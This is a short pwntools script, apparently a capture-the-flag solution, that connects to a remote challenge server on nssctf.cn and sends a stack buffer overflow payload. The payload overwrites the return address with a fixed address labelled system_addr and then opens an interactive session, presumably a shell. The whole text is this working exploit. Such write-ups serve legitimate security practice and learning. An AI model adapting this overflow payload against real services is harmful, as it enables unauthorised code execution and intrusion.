from pwn import *

#io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 21711)

ret_addr = 0x40101a
system_addr = 0x401229

payload = b"a" * (0xa + 0x8) + p64(system_addr)

io.sendline(payload)
io.interactive()
